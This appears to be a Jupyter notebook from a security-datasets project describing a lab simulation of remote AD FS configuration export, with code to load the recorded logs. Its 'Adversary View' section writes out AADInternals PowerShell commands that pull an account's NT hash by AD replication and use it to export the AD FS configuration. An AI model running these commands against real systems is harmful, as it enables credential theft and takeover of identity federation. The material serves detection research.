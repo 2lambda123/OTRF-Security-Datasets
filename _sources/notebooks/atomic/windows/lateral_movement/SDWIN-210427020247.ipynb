{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ac071c9f",
   "metadata": {},
   "source": [
    "# Export ADFS Database Configuration Remotely"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "28d2a5bc",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1fdd60d6",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2021/04/27 |\n",
    "| Modification Date | 2021/04/27 |\n",
    "| Tactics           | [TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T0000](https://attack.mitre.org/techniques/T0000) |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7b54fa96",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents a threat actor exporting the AD FS database configuration remotely over http."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "320f1163",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "379c20a2",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/aadinternals_export_adfsdatabaseconfig_remotely.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/aadinternals_export_adfsdatabaseconfig_remotely.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/aadinternals_export_adfsdatabaseconfig_remotely.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/aadinternals_export_adfsdatabaseconfig_remotely.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "48feb525",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d4bc29a",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cf8e930a",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| PowerShell Module | AADInternals | [Export-AADIntADFSConfiguration](None) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1e67def7",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "# ADFS Service Account\n",
    "$UserObjectGUID = 'd1713029-72e2-4101-8486-1db074944f23'\n",
    "# Domain Admin credentials\n",
    "$credentials = get-credential\n",
    "# Get Hash via AD replication\n",
    "$Hash = Get-AADIntADUserNTHash -ObjectGuid $UserObjectGUID -Credentials $credentials -Server 'DC01.blacksmith.local' -AsHex\n",
    "# Retrieve AD FS database configuration over HTTP\n",
    "$ADFSDatabaseConfig = Export-AADIntADFSConfiguration -Hash '97bff5626068f351a5f9891b97b04640' -SID 'S-1-5-21-3226634481-2224579835-4276826623-1103' -Server ADFS01.blacksmith.local\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "25871faa",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c2a4e4f",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15fa151b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/aadinternals_export_adfsdatabaseconfig_remotely.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d7e3a028",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db02965a",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7cf2b8d3",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4dd6ee9d",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d81b2ccb",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) \n",
    "* [https://twitter.com/jack_halon/status/1370192318377168897](https://twitter.com/jack_halon/status/1370192318377168897) \n",
    "* [https://github.com/OTRF/Azure-Sentinel2Go/tree/master/grocery-list/Win10-AD-MXS](https://github.com/OTRF/Azure-Sentinel2Go/tree/master/grocery-list/Win10-AD-MXS) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
